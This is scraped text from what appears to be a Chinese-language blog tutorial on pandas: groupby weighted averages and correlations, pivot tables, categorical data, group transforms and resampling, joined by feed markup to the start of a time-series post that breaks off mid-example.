也可以在代码中预定义各组的填充值。由于分组具有一个name属性，所以我们可以拿来用一下： 12345fill_values = &#123;'East': 0.5, 'West': -1&#125;fill_func = lambda g: g.fillna(fill_values[g.name])data.groupby(group_key).apply(fill_func) Ohio -0.343101 New York 1.024389 Vermont 0.500000 Florida -0.423204 Oregon 0.114283 Nevada -1.000000 California -1.727345 Idaho -1.000000 dtype: float64 示例：分组加权平均数和相关系数根据groupby的“拆分－应用－合并”范式，可以进行DataFrame的列与列之间或两个Series之间的运算（比如分组加权平均）。以下面这个数据集为例，它含有分组键、值以及一些权重值： 1234df = pd.DataFrame(&#123;'category': ['a', 'a', 'a', 'a', 'b', 'b', 'b', 'b'], 'data': np.random.randn(8), 'weights': np.random.rand(8)&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } category data weights 0 a -0.980463 0.247153 1 a 0.148452 0.912352 2 a -1.067199 0.719493 3 a 1.837065 0.883523 4 b -1.030439 0.907246 5 b 0.120672 0.538387 6 b -0.306529 0.423223 7 b 0.709020 0.552725 利用 category 计算分组加权平均数： 12345grouped = df.groupby('category')get_wavg = lambda g: np.average(g['data'], weights=g['weights'])grouped.apply(get_wavg) category a 0.270898 b -0.250964 dtype: float64 另一个例子，考虑一个来自Yahoo!Finance的数据集，其中含有几只股票和标准普尔500指数（符号SPX）的收盘价： 12close_px = pd.read_csv('data/examples/stock_px_2.csv', parse_dates=True, index_col=0)close_px.info() &lt;class &apos;pandas.core.frame.DataFrame&apos;&gt; DatetimeIndex: 2214 entries, 2003-01-02 to 2011-10-14 Data columns (total 4 columns): AAPL 2214 non-null float64 MSFT 2214 non-null float64 XOM 2214 non-null float64 SPX 2214 non-null float64 dtypes: float64(4) memory usage: 86.5 KB 1close_px.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM SPX 2003-01-02 7.40 21.11 29.22 909.03 2003-01-03 7.45 21.14 29.24 908.59 2003-01-06 7.45 21.52 29.96 929.01 2003-01-07 7.43 21.93 28.95 922.93 2003-01-08 7.28 21.31 28.83 909.93 来做一个比较有趣的任务：计算一个由日收益率（通过百分数变化计算）与SPX之间的年度相关系数组成的DataFrame。下面是一个实现办法，我们先创建一个函数，用它计算每列和SPX列的成对相关系数： 1234spx_corr = lambda x: x.corrwith(x['SPX'])# 我们使用pct_change计算close_px的百分比变化rets = close_px.pct_change().dropna()rets.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM SPX 2003-01-03 0.006757 0.001421 0.000684 -0.000484 2003-01-06 0.000000 0.017975 0.024624 0.022474 2003-01-07 -0.002685 0.019052 -0.033712 -0.006545 2003-01-08 -0.020188 -0.028272 -0.004145 -0.014086 2003-01-09 0.008242 0.029094 0.021159 0.019386 最后，我们用年对百分比变化进行分组，可以用一个一行的函数，从每行的标签返回每个datetime标签的year属性： 12345get_year = lambda x: x.yearby_year = rets.groupby(get_year)by_year.apply(spx_corr) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } AAPL MSFT XOM SPX 2003 0.541124 0.745174 0.661265 1.0 2004 0.374283 0.588531 0.557742 1.0 2005 0.467540 0.562374 0.631010 1.0 2006 0.428267 0.406126 0.518514 1.0 2007 0.508118 0.658770 0.786264 1.0 2008 0.681434 0.804626 0.828303 1.0 2009 0.707103 0.654902 0.797921 1.0 2010 0.710105 0.730118 0.839057 1.0 2011 0.691931 0.800996 0.859975 1.0 还可以计算列与列之间的相关系数。这里，我们计算Apple和Microsoft的年相关系数： 1by_year.apply(lambda g: g['AAPL'].corr(g['MSFT'])) 2003 0.480868 2004 0.259024 2005 0.300093 2006 0.161735 2007 0.417738 2008 0.611901 2009 0.432738 2010 0.571946 2011 0.581987 dtype: float64 示例：组级别的线性回归顺着上一个例子继续，你可以用groupby执行更为复杂的分组统计分析，只要函数返回的是pandas对象或标量值即可。例如，我可以定义下面这个regress函数（利用statsmodels计量经济学库）对各数据块执行普通最小二乘法（Ordinary Least Squares，OLS）回归： 1234567import statsmodels.api as smdef regress(data, yvar, xvars): Y = data[yvar] X = data[xvars] X['intercept'] = 1. result = sm.OLS(Y, X).fit() return result.params 现在，为了按年计算AAPL对SPX收益率的线性回归，执行： 1by_year.apply(regress, 'AAPL', ['SPX']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } SPX intercept 2003 1.195406 0.000710 2004 1.363463 0.004201 2005 1.766415 0.003246 2006 1.645496 0.000080 2007 1.198761 0.003438 2008 0.968016 -0.001110 2009 0.879103 0.002954 2010 1.052608 0.001261 2011 0.806605 0.001514 透视表和交叉表透视表（pivot table）是各种电子表格程序和其他数据分析软件中一种常见的数据汇总工具。它根据一个或多个键对数据进行聚合，并根据行和列上的分组键将数据分配到各个矩形区域中。在Python和pandas中，可以通过本章所介绍的groupby功能以及（能够利用层次化索引的）重塑运算制作透视表。DataFrame有一个pivot_table方法，此外还有一个顶级的pandas.pivot_table函数。除能为groupby提供便利之外，pivot_table还可以添加分项小计，也叫做margins。 1tips.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } total_bill tip smoker day time size tip_pct 0 16.99 1.01 No Sun Dinner 2 0.059447 1 10.34 1.66 No Sun Dinner 3 0.160542 2 21.01 3.50 No Sun Dinner 3 0.166587 3 23.68 3.31 No Sun Dinner 2 0.139780 4 24.59 3.61 No Sun Dinner 4 0.146808 假设我想要根据day和smoker计算分组平均数（pivot_table的默认聚合类型），并将day和smoker放到行上： 1tips.pivot_table(index=['day', 'smoker']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } size tip tip_pct total_bill day smoker Fri No 2.250000 2.812500 0.151650 18.420000 Yes 2.066667 2.714000 0.174783 16.813333 Sat No 2.555556 3.102889 0.158048 19.661778 Yes 2.476190 2.875476 0.147906 21.276667 Sun No 2.929825 3.167895 0.160113 20.506667 Yes 2.578947 3.516842 0.187250 24.120000 Thur No 2.488889 2.673778 0.160298 17.113111 Yes 2.352941 3.030000 0.163863 19.190588 可以用groupby直接来做。现在，假设我们只想聚合tip_pct和size，而且想根据time进行分组。我将smoker放到列上，把day放到行上： 1tips.pivot_table(['tip_pct', 'size'], index=['time', 'day'], columns='smoker') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } size tip_pct smoker No Yes No Yes time day Dinner Fri 2.000000 2.222222 0.139622 0.165347 Sat 2.555556 2.476190 0.158048 0.147906 Sun 2.929825 2.578947 0.160113 0.187250 Thur 2.000000 NaN 0.159744 NaN Lunch Fri 3.000000 1.833333 0.187735 0.188937 Thur 2.500000 2.352941 0.160311 0.163863 1tips.pivot_table(['tip_pct', 'size'], index=['time', 'day']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } size tip_pct time day Dinner Fri 2.166667 0.158916 Sat 2.517241 0.153152 Sun 2.842105 0.166897 Thur 2.000000 0.159744 Lunch Fri 2.000000 0.188765 Thur 2.459016 0.161301 还可以对这个表作进一步的处理，传入 margins=True 添加分项小计。这将会添加标签为All的行和列，其值对应于单个等级中所有数据的分组统计： 1tips.pivot_table(['tip_pct', 'size'], index=['time', 'day'], columns='smoker', margins=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead tr th { text-align: left; } .dataframe thead tr:last-of-type th { text-align: right; } size tip_pct smoker No Yes All No Yes All time day Dinner Fri 2.000000 2.222222 2.166667 0.139622 0.165347 0.158916 Sat 2.555556 2.476190 2.517241 0.158048 0.147906 0.153152 Sun 2.929825 2.578947 2.842105 0.160113 0.187250 0.166897 Thur 2.000000 NaN 2.000000 0.159744 NaN 0.159744 Lunch Fri 3.000000 1.833333 2.000000 0.187735 0.188937 0.188765 Thur 2.500000 2.352941 2.459016 0.160311 0.163863 0.161301 All 2.668874 2.408602 2.569672 0.159328 0.163196 0.160803 要使用其他的聚合函数，将其传给aggfunc即可。例如，使用count或len可以得到有关分组大小的交叉表（计数或频率）： 1tips.pivot_table('tip_pct', index=['time', 'smoker'], columns='day', aggfunc=len, margins=True) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } day Fri Sat Sun Thur All time smoker Dinner No 3.0 45.0 57.0 1.0 106.0 Yes 9.0 42.0 19.0 NaN 70.0 Lunch No 1.0 NaN NaN 44.0 45.0 Yes 6.0 NaN NaN 17.0 23.0 All 19.0 87.0 76.0 62.0 244.0 如果存在空的组合（也就是NA），你可能会希望设置一个fill_value： 12tips.pivot_table('tip_pct', index=['time', 'size', 'smoker'], columns='day', aggfunc='mean', fill_value=0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } day Fri Sat Sun Thur time size smoker Dinner 1 No 0.000000 0.137931 0.000000 0.000000 Yes 0.000000 0.325733 0.000000 0.000000 2 No 0.139622 0.162705 0.168859 0.159744 Yes 0.171297 0.148668 0.207893 0.000000 3 No 0.000000 0.154661 0.152663 0.000000 Yes 0.000000 0.144995 0.152660 0.000000 4 No 0.000000 0.150096 0.148143 0.000000 Yes 0.117750 0.124515 0.193370 0.000000 5 No 0.000000 0.000000 0.206928 0.000000 Yes 0.000000 0.106572 0.065660 0.000000 6 No 0.000000 0.000000 0.103799 0.000000 Lunch 1 No 0.000000 0.000000 0.000000 0.181728 Yes 0.223776 0.000000 0.000000 0.000000 2 No 0.000000 0.000000 0.000000 0.166005 Yes 0.181969 0.000000 0.000000 0.158843 3 No 0.187735 0.000000 0.000000 0.084246 Yes 0.000000 0.000000 0.000000 0.204952 4 No 0.000000 0.000000 0.000000 0.138919 Yes 0.000000 0.000000 0.000000 0.155410 5 No 0.000000 0.000000 0.000000 0.121389 6 No 0.000000 0.000000 0.000000 0.173706 pivot_table的参数说明请参见表 pandas高级应用分类数据通过使用它，提高性能和内存的使用率。 背景和目的表中的一列通常会有重复的包含不同值的小集合的情况。我们已经学过了unique和value_counts，它们可以从数组提取出不同的值，并分别计算频率： 12values = pd.Series(['apple', 'orange', 'apple', 'apple'] * 2)values 0 apple 1 orange 2 apple 3 apple 4 apple 5 orange 6 apple 7 apple dtype: object 1pd.unique(values) array([&apos;apple&apos;, &apos;orange&apos;], dtype=object) 1pd.value_counts(values) apple 6 orange 2 dtype: int64 许多数据系统（数据仓库、统计计算或其它应用）都发展出了特定的表征重复值的方法，以进行高效的存储和计算。在数据仓库中，最好的方法是使用所谓的包含不同值的维表(Dimension Table)，将主要的参数存储为引用维表整数键： 就像 mysql 的分表存储 12values = pd.Series([0, 1, 0, 0] * 2)values 0 0 1 1 2 0 3 0 4 0 5 1 6 0 7 0 dtype: int64 12dim = pd.Series(['apple', 'orange'])dim 0 apple 1 orange dtype: object 可以使用take方法存储原始的字符串Series： 1dim.take(values) 0 apple 1 orange 0 apple 0 apple 0 apple 1 orange 0 apple 0 apple dtype: object 这种用整数表示的方法称为分类或字典编码表示法。不同值得数组称为分类、字典或数据级。本书中，我们使用分类的说法。表示分类的整数值称为分类编码或简单地称为编码。 pandas的分类类型pandas有一个特殊的分类类型，用于保存使用整数分类表示法的数据。 12345678910fruits = ['apple', 'orange', 'apple', 'apple'] * 2N = len(fruits)df = pd.DataFrame(&#123;'fruit': fruits, 'basket_id': np.arange(N), 'count': np.random.randint(3, 15, size=N), 'weight': np.random.uniform(0, 4, size=N)&#125;, columns=['basket_id', 'fruit', 'count', 'weight'])df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } basket_id fruit count weight 0 0 apple 11 0.661412 1 1 orange 6 2.661072 2 2 apple 10 3.956839 3 3 apple 10 3.491835 4 4 apple 6 2.954149 5 5 orange 12 3.967850 6 6 apple 8 0.093289 7 7 apple 3 3.056569 这里，df[&#39;fruit&#39;] 是一个Python字符串对象的数组。我们可以通过调用它，将它转变为分类： 12fruit_cat = df['fruit'].astype('category')fruit_cat 0 apple 1 orange 2 apple 3 apple 4 apple 5 orange 6 apple 7 apple Name: fruit, dtype: category Categories (2, object): [apple, orange] fruit_cat的值不是NumPy数组，而是一个pandas.Categorical实例： 12c = fruit_cat.valuesc [apple, orange, apple, apple, apple, orange, apple, apple] Categories (2, object): [apple, orange] 1type(c) pandas.core.arrays.categorical.Categorical 分类对象有categories和codes属性： 1c.categories Index([&apos;apple&apos;, &apos;orange&apos;], dtype=&apos;object&apos;) 1c.codes array([0, 1, 0, 0, 0, 1, 0, 0], dtype=int8) 你可将DataFrame的列通过分配转换结果，转换为分类： 1df['fruit'] = df['fruit'].astype('category') 1df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } basket_id fruit count weight 0 0 apple 11 0.661412 1 1 orange 6 2.661072 2 2 apple 10 3.956839 3 3 apple 10 3.491835 4 4 apple 6 2.954149 5 5 orange 12 3.967850 6 6 apple 8 0.093289 7 7 apple 3 3.056569 1df.fruit 0 apple 1 orange 2 apple 3 apple 4 apple 5 orange 6 apple 7 apple Name: fruit, dtype: category Categories (2, object): [apple, orange] 你还可以从其它Python序列直接创建pandas.Categorical： 12my_categories = pd.Categorical(['foo', 'bar', 'baz', 'foo', 'bar'])my_categories [foo, bar, baz, foo, bar] Categories (3, object): [bar, baz, foo] 如果你已经从其它源获得了分类编码，你还可以使用from_codes构造器： 1234567categories = ['foo', 'bar', 'baz']codes = [0, 1, 2, 0, 0, 1]my_cats_2 = pd.Categorical.from_codes(codes, categories)my_cats_2 [foo, bar, baz, foo, foo, bar] Categories (3, object): [foo, bar, baz] 与显示指定不同，分类变换不认定指定的分类顺序。因此取决于输入数据的顺序，categories数组的顺序会不同。当使用from_codes或其它的构造器时，你可以指定分类一个有意义的顺序： 12ordered_cat = pd.Categorical.from_codes(codes, categories, ordered=True)ordered_cat [foo, bar, baz, foo, foo, bar] Categories (3, object): [foo &lt; bar &lt; baz] 无序的分类实例可以通过as_ordered排序： 1my_cats_2.as_ordered() [foo, bar, baz, foo, foo, bar] Categories (3, object): [foo &lt; bar &lt; baz] 用分类进行计算来看一些随机的数值数据，使用pandas.qcut面元函数。它会返回pandas.Categorical，我们之前使用过pandas.cut，但没解释分类是如何工作的： 1234np.random.seed(12345)draws = np.random.randn(1000)draws[:5] array([-0.20470766, 0.47894334, -0.51943872, -0.5557303 , 1.96578057]) 计算这个数据的分位面元，提取一些统计信息： 12bins = pd.qcut(draws, 4)bins [(-0.684, -0.0101], (-0.0101, 0.63], (-0.684, -0.0101], (-0.684, -0.0101], (0.63, 3.928], ..., (-0.0101, 0.63], (-0.684, -0.0101], (-2.9499999999999997, -0.684], (-0.0101, 0.63], (0.63, 3.928]] Length: 1000 Categories (4, interval[float64]): [(-2.9499999999999997, -0.684] &lt; (-0.684, -0.0101] &lt; (-0.0101, 0.63] &lt; (0.63, 3.928]] 虽然有用，确切的样本分位数与分位的名称相比，不利于生成汇总。我们可以使用labels参数qcut，实现目的： 12bins = pd.qcut(draws, 4, labels=['Q1', 'Q2', 'Q3', 'Q4'])bins [Q2, Q3, Q2, Q2, Q4, ..., Q3, Q2, Q1, Q3, Q4] Length: 1000 Categories (4, object): [Q1 &lt; Q2 &lt; Q3 &lt; Q4] 1bins.codes[:10] array([1, 2, 1, 1, 3, 3, 2, 2, 3, 3], dtype=int8) 加上标签的面元分类不包含数据面元边界的信息，因此可以使用groupby提取一些汇总信息： 12bins = pd.Series(bins, name='quartile')bins.head() 0 Q2 1 Q3 2 Q2 3 Q2 4 Q4 Name: quartile, dtype: category Categories (4, object): [Q1 &lt; Q2 &lt; Q3 &lt; Q4] 12345results = (pd.Series(draws) .groupby(bins) .agg(['count', 'min', 'max']) .reset_index())results .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } quartile count min max 0 Q1 250 -2.949343 -0.685484 1 Q2 250 -0.683066 -0.010115 2 Q3 250 -0.010032 0.628894 3 Q4 250 0.634238 3.927528 分位数列保存了原始的面元分类信息，包括排序： 1results['quartile'] 0 Q1 1 Q2 2 Q3 3 Q4 Name: quartile, dtype: category Categories (4, object): [Q1 &lt; Q2 &lt; Q3 &lt; Q4] 用分类提高性能如果你是在一个特定数据集上做大量分析，将其转换为分类可以极大地提高效率。DataFrame列的分类使用的内存通常少的多。来看一些包含一千万元素的Series，和一些不同的分类： 1234N = 10000000draws = pd.Series(np.random.randn(N))labels = pd.Series(['foo', 'bar', 'baz', 'qux'] * (N // 4)) 现在，将标签转换为分类： 1categories = labels.astype('category') 这时，可以看到标签使用的内存远比分类多： 1labels.memory_usage() 80000080 1categories.memory_usage() 10000272 转换为分类不是没有代价的，但这是一次性的代价： 1%time _ = labels.astype('category') Wall time: 429 ms GroupBy使用分类操作明显更快，是因为底层的算法使用整数编码数组，而不是字符串数组。 分类方法包含分类数据的Series有一些特殊的方法，类似于Series.str字符串方法。它还提供了方便的分类和编码的使用方法。看下面的Series： 12345s = pd.Series(['a', 'b', 'c', 'd'] * 2)cat_s = s.astype('category')cat_s 0 a 1 b 2 c 3 d 4 a 5 b 6 c 7 d dtype: category Categories (4, object): [a, b, c, d] 特别的cat属性提供了分类方法的入口： 1cat_s.cat.codes 0 0 1 1 2 2 3 3 4 0 5 1 6 2 7 3 dtype: int8 1cat_s.cat.categories Index([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;], dtype=&apos;object&apos;) 假设我们知道这个数据的实际分类集，超出了数据中的四个值。我们可以使用set_categories方法改变它们： 123actual_categories = ['a', 'b', 'c', 'd', 'e']cat_s2 = cat_s.cat.set_categories(actual_categories)cat_s2 0 a 1 b 2 c 3 d 4 a 5 b 6 c 7 d dtype: category Categories (5, object): [a, b, c, d, e] 虽然数据看起来没变，新的分类将反映在它们的操作中。例如，如果有的话，value_counts表示分类： 1cat_s.value_counts() d 2 c 2 b 2 a 2 dtype: int64 1cat_s2.value_counts() d 2 c 2 b 2 a 2 e 0 dtype: int64 在大数据集中，分类经常作为节省内存和高性能的便捷工具。过滤完大DataFrame或Series之后，许多分类可能不会出现在数据中。我们可以使用remove_unused_categories方法删除没看到的分类： 12cat_s3 = cat_s[cat_s.isin(['a', 'b'])]cat_s3 0 a 1 b 4 a 5 b dtype: category Categories (4, object): [a, b, c, d] 1cat_s3.cat.remove_unused_categories() 0 a 1 b 4 a 5 b dtype: category Categories (2, object): [a, b] 可用的分类方法 为建模创建虚拟变量当你使用统计或机器学习工具时，通常会将分类数据转换为虚拟变量，也称为one-hot编码。这包括创建一个不同类别的列的DataFrame；这些列包含给定分类的1s，其它为0。 12cat_s = pd.Series(['a', 'b', 'c', 'd'] * 2, dtype='category')cat_s 0 a 1 b 2 c 3 d 4 a 5 b 6 c 7 d dtype: category Categories (4, object): [a, b, c, d] pandas.get_dummies 函数可以转换这个分类数据为包含虚拟变量的DataFrame： 1pd.get_dummies(cat_s) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a b c d 0 1 0 0 0 1 0 1 0 0 2 0 0 1 0 3 0 0 0 1 4 1 0 0 0 5 0 1 0 0 6 0 0 1 0 7 0 0 0 1 GroupBy高级应用分组转换在分组操作中学习了apply方法，进行转换。还有另一个transform方法，它与apply很像，但是对使用的函数有一定限制： 它可以产生向分组形状广播标量值 它可以产生一个和输入组形状相同的对象 它不能修改输入 12df = pd.DataFrame(&#123;'key': ['a', 'b', 'c'] * 4, 'value': np.arange(12.)&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } key value 0 a 0.0 1 b 1.0 2 c 2.0 3 a 3.0 4 b 4.0 5 c 5.0 6 a 6.0 7 b 7.0 8 c 8.0 9 a 9.0 10 b 10.0 11 c 11.0 按键进行分组： 12g = df.groupby('key').valueg.mean() key a 4.5 b 5.5 c 6.5 Name: value, dtype: float64 假设我们想产生一个和 df[&#39;value&#39;] 形状相同的Series，但值替换为按键分组的平均值。我们可以传递函数 lambda x: x.mean() 进行转换： 1g.transform(lambda x: x.mean()) 0 4.5 1 5.5 2 6.5 3 4.5 4 5.5 5 6.5 6 4.5 7 5.5 8 6.5 9 4.5 10 5.5 11 6.5 Name: value, dtype: float64 对于内置的聚合函数，我们可以传递一个字符串假名作为GroupBy的agg方法： 1g.transform('mean') 0 4.5 1 5.5 2 6.5 3 4.5 4 5.5 5 6.5 6 4.5 7 5.5 8 6.5 9 4.5 10 5.5 11 6.5 Name: value, dtype: float64 与apply类似，transform的函数会返回Series，但是结果必须与输入大小相同。举个例子，我们可以用lambda函数将每个分组乘以2： 1g.transform(lambda x: x * 2) 0 0.0 1 2.0 2 4.0 3 6.0 4 8.0 5 10.0 6 12.0 7 14.0 8 16.0 9 18.0 10 20.0 11 22.0 Name: value, dtype: float64 看一个由简单聚合构造的的分组转换函数：我们用transform或apply可以获得等价的结果： 123def normalize(x): return (x - x.mean()) / x.std()g.transform(normalize) 0 -1.161895 1 -1.161895 2 -1.161895 3 -0.387298 4 -0.387298 5 -0.387298 6 0.387298 7 0.387298 8 0.387298 9 1.161895 10 1.161895 11 1.161895 Name: value, dtype: float64 1g.apply(normalize) 0 -1.161895 1 -1.161895 2 -1.161895 3 -0.387298 4 -0.387298 5 -0.387298 6 0.387298 7 0.387298 8 0.387298 9 1.161895 10 1.161895 11 1.161895 Name: value, dtype: float64 分组的时间重采样对于时间序列数据，resample方法从语义上是一个基于内在时间的分组操作。 123456N = 15times = pd.date_range('2017-05-20 00:00', freq='1min', periods=N)df = pd.DataFrame(&#123;'time': times, 'value': np.arange(N)&#125;)df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } time value 0 2017-05-20 00:00:00 0 1 2017-05-20 00:01:00 1 2 2017-05-20 00:02:00 2 3 2017-05-20 00:03:00 3 4 2017-05-20 00:04:00 4 5 2017-05-20 00:05:00 5 6 2017-05-20 00:06:00 6 7 2017-05-20 00:07:00 7 8 2017-05-20 00:08:00 8 9 2017-05-20 00:09:00 9 10 2017-05-20 00:10:00 10 11 2017-05-20 00:11:00 11 12 2017-05-20 00:12:00 12 13 2017-05-20 00:13:00 13 14 2017-05-20 00:14:00 14 这里，我们可以用time作为索引，然后重采样： 1df.set_index('time').resample('5min').count() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } value time 2017-05-20 00:00:00 5 2017-05-20 00:05:00 5 2017-05-20 00:10:00 5 假设DataFrame包含多个时间序列，用一个额外的分组键的列进行标记： 1234df2 = pd.DataFrame(&#123;'time': times.repeat(3), 'key': np.tile(['a', 'b', 'c'], N), 'value': np.arange(N * 3.)&#125;)df2.head() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } time key value 0 2017-05-20 00:00:00 a 0.0 1 2017-05-20 00:00:00 b 1.0 2 2017-05-20 00:00:00 c 2.0 3 2017-05-20 00:01:00 a 3.0 4 2017-05-20 00:01:00 b 4.0 12]]></content>
      <categories>
        <category>数据分析</category>
        <category>pandas</category>
      </categories>
      <tags>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pandas 时间序列]]></title>
    <url>%2F2019%2F04%2F15%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%2Fpandas-%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%2F</url>
    <content type="text"><![CDATA[参考引用 1234567891011import pandas as pdfrom pandas import Series, DataFrameimport numpy as npfrom numpy import nan as NAfrom datetime import datetimefrom datetime import timedeltafrom dateutil.parser import parsefrom pandas.tseries.offsets import Hour, Minutefrom pandas.tseries.offsets import Day, MonthEndimport pytzfrom pandas.tseries.offsets import Hour pandas提供了许多内置的时间序列处理工具和数据算法。因此，你可以高效处理非常大的时间序列，轻松地进行切片/切块、聚合、对定期/不定期的时间序列进行重采样等。有些工具特别适合金融和经济应用，你当然也可以用它们来分析服务器日志数据。 日期和时间数据类型及工具python 标准库提供的相关的时间库 Python标准库包含用于日期（date）和时间（time）数据的数据类型，而且还有日历方面的功能。我们主要会用到datetime、time以及calendar模块。datetime.datetime（也可以简写为datetime）是用得最多的数据类型： 12now = datetime.now()now datetime.datetime(2019, 5, 14, 9, 21, 6, 222759) 1now.year, now.month, now.day (2019, 5, 14) datetime以毫秒形式存储日期和时间。timedelta表示两个datetime对象之间的时间差： 12delta = datetime(2011, 1, 7) - datetime(2008, 6, 24, 8, 15)delta datetime.timedelta(days=926, seconds=56700) 1delta.days, delta.seconds (926, 56700) 1timedelta(12) datetime.timedelta(days=12) 12start = datetime(2011, 1, 7)start + timedelta(12) datetime.datetime(2011, 1, 19, 0, 0) 1start - 2 * timedelta(12) datetime.datetime(2010, 12, 14, 0, 0) datetime模块中的数据类型 字符串和datetime的相互转换利用str或strftime方法（传入一个格式化字符串），datetime对象和pandas的Timestamp对象（稍后就会介绍）可以被格式化为字符串： 12stamp = datetime(2011, 1, 3)stamp datetime.datetime(2011, 1, 3, 0, 0) 1str(stamp) &apos;2011-01-03 00:00:00&apos; 1stamp.strftime('%Y-%m-%d') &apos;2011-01-03&apos; datetime格式定义 . datetime.strptime可以用这些格式化编码将字符串转换为日期： 12value = '2011-01-03'datetime.strptime(value, '%Y-%m-%d') datetime.datetime(2011, 1, 3, 0, 0) 12datestrs = ['7/6/2011', '8/6/2011'][datetime.strptime(x, '%m/%d/%Y') for x in datestrs] [datetime.datetime(2011, 7, 6, 0, 0), datetime.datetime(2011, 8, 6, 0, 0)] datetime.strptime是通过已知格式进行日期解析的最佳方式。但是每次都要编写格式定义是很麻烦的事情，尤其是对于一些常见的日期格式。这种情况下，你可以用dateutil这个第三方包中的parser.parse方法（pandas中已经自动安装好了） 1parse('2011-01-03') datetime.datetime(2011, 1, 3, 0, 0) 1parse('Jan 31, 1997 10:45 PM') datetime.datetime(1997, 1, 31, 22, 45) 在国际通用的格式中，日出现在月的前面很普遍，传入dayfirst=True即可解决这个问题： 1parse('6/12/2011', dayfirst=True) datetime.datetime(2011, 12, 6, 0, 0) pandas通常是用于处理成组日期的，不管这些日期是DataFrame的轴索引还是列。to_datetime方法可以解析多种不同的日期表示形式。对标准日期格式（如ISO8601）的解析非常快： 12datestrs = ['2011-07-06 12:00:00', '2011-08-06 00:00:00']pd.to_datetime(datestrs) DatetimeIndex([&apos;2011-07-06 12:00:00&apos;, &apos;2011-08-06 00:00:00&apos;], dtype=&apos;datetime64[ns]&apos;, freq=None) 它还可以处理缺失值（None、空字符串等）： 12idx = pd.to_datetime(datestrs + [None])idx DatetimeIndex([&apos;2011-07-06 12:00:00&apos;, &apos;2011-08-06 00:00:00&apos;, &apos;NaT&apos;], dtype=&apos;datetime64[ns]&apos;, freq=None) 1idx[2] NaT 1pd.isnull(idx) array([False, False, True]) NaT（Not a Time）是pandas中时间戳数据的null值。 注意：dateutil.parser是一个实用但不完美的工具。比如说，它会把一些原本不是日期的字符串认作是日期（比如”42”会被解析为2042年的今天）。 datetime对象还有一些特定于当前环境（位于不同国家或使用不同语言的系统）的格式化选项。例如，德语或法语系统所用的月份简写就与英语系统所用的不同。下表进行了总结。特定于当前环境的日期格式Python中获取当前日期的格式 1datetime(2011, 1, 3).strftime("%A") &apos;Monday&apos; 时间序列基础pandas最基本的时间序列类型就是以时间戳（通常以Python字符串或datatime对象表示）为索引的Series： 1234dates = [datetime(2011, 1, 2), datetime(2011, 1, 5), datetime(2011, 1, 7), datetime(2011, 1, 8), datetime(2011, 1, 10), datetime(2011, 1, 12)]ts = pd.Series(np.random.randn(6), index=dates)ts 2011-01-02 0.502699 2011-01-05 1.188837 2011-01-07 -1.558365 2011-01-08 0.770966 2011-01-10 0.372228 2011-01-12 -1.640982 dtype: float64 这些datetime对象实际上是被放在一个DatetimeIndex中的： 1ts.index DatetimeIndex([&apos;2011-01-02&apos;, &apos;2011-01-05&apos;, &apos;2011-01-07&apos;, &apos;2011-01-08&apos;, &apos;2011-01-10&apos;, &apos;2011-01-12&apos;], dtype=&apos;datetime64[ns]&apos;, freq=None) 跟其他Series一样，不同索引的时间序列之间的算术运算会自动按日期对齐： 12# ts[::2] 是每隔两个取一个ts + ts[::2] 2011-01-02 1.005399 2011-01-05 NaN 2011-01-07 -3.116730 2011-01-08 NaN 2011-01-10 0.744455 2011-01-12 NaN dtype: float64 pandas用NumPy的datetime64数据类型以纳秒形式存储时间戳： 1ts.index.dtype dtype(&apos;&lt;M8[ns]&apos;) DatetimeIndex中的各个标量值是pandas的Timestamp对象： 1ts.index[0] Timestamp(&apos;2011-01-02 00:00:00&apos;) 只要有需要，TimeStamp可以随时自动转换为datetime对象。此外，它还可以存储频率信息（如果有的话），且知道如何执行时区转换以及其他操作。 索引、选取、子集构造当你根据标签索引选取数据时，时间序列和其它的pandas.Series很像： 12stamp = ts.index[2]stamp 